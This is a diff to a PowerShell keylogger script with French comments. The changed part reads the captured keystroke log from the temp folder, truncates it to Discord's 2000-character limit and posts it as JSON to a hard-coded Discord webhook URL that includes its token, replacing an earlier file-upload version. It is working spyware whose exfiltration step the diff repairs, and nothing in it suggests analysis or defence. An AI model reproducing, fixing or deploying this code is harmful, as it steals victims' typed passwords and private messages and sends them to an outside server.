@@ -81,23 +81,30 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 # Lancer le keylogger
 KeyLog
 
-# Envoyer le fichier sur Discord
+# Envoyer le contenu sur Discord (texte simple, pas de fichier)
 $logfile = "$env:temp\key.log"
 $webhook = "https://discord.com/api/webhooks/1197260699768987748/MusyfmoPCs0DkrWb1IH2uQ0Aw6p369foF6pVYynOxL5x0wYokip9_a-kkhpbhWVATEHn"
 
-Write-Host "`nEnvoi du fichier sur Discord..." -ForegroundColor Yellow
+Write-Host "`nEnvoi sur Discord..." -ForegroundColor Yellow
 
 if (Test-Path $logfile) {
     try {
-        $form = @{
-            "payload_json" = '{"content":"Keylog enregistre"}'
-            "file" = Get-Item -Path $logfile
+        $contenu = Get-Content $logfile -Raw
+        
+        # Découper si > 2000 caractères (limite Discord)
+        if ($contenu.Length -gt 2000) {
+            $contenu = $contenu.Substring(0, 1997) + "..."
         }
         
-        Invoke-RestMethod -Uri $webhook -Method Post -Form $form
-        Write-Host "Fichier envoye avec succes !" -ForegroundColor Green
+        # Format JSON simple et compatible
+        $json = @{
+            content = "Keylog: " + $contenu
+        } | ConvertTo-Json
+        
+        Invoke-RestMethod -Uri $webhook -Method Post -Body $json -ContentType "application/json" -ErrorAction Stop
+        Write-Host "Envoye avec succes !" -ForegroundColor Green
     } catch {
-        Write-Host "Erreur : $_" -ForegroundColor Red
+        Write-Host "Erreur Discord : $_" -ForegroundColor Red
     }
 } else {
     Write-Host "Fichier non trouve" -ForegroundColor Red
